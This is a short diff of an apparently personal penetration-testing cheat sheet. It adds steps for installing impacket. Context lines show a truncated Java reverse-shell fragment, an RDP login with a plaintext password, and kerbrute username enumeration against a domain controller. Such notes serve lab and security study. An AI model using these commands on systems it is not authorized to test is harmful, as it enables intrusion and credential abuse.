@@ -451,7 +451,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. ```xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389```
 > 1. Or use Remmina for GUI 
 
-
+#### Install impacket
+> 1. First clone the repo to Kali box.
+> 1. Go inside the cloned repo.
+> 1. Run ```python3 -m pip install .```
+	
 #### Active Directory 
 > 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
 es-shortlist.txt```
